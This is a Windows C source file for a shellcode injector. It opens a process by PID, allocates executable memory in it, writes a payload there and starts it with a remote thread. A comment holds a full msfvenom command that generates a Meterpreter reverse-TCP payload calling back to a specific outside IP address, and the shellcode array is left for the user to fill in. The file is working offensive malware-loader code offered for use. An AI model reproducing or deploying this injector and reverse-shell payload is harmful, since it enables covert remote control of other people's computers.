#include <Windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID = NULL, TID = NULL;
HANDLE hProcess = NULL, hThread = NULL;
LPVOID rBuffer = NULL;

//msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=67.160.158.60 EXITFUNC=thread -f c --var-name=crowPuke

//unsigned char crowPuke[] = ; //generate your own shell code here

int main(int argc, char* argv[]) {
	
	if (argc < 2) {
		
		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;

	}

	PID = atoi(argv[1]);
	printf(" %s trying to open a handle to process (%ld)\n", i, PID);
	
	// open a handle to the process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);

	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process (%ld), error %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s got a handle to the process!\n\\ --0x%p\n", k, hProcess);

	//ALLOCATE BYTES TO PROCESS MEMORY
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n",k, sizeof(crowPuke));

	//actually write the allocated memory to the process memory
	WriteProcessMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(crowPuke));

	//create thread to run our payload
	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL, 
		0,
		(LPTHREAD_START_ROUTINE)rBuffer, //specify the starting point for execution for a thread, casted to buffer, so it knows to start exec from the buffers entry point
		NULL,
		0,//start flag, 0 runs immediately
		0,
		&TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n\\--0x%p\n", k, TID, hThread);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n", k);

	printf("%s cleaning up...\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished! nice job:)\n", k);

	return EXIT_SUCCESS;

}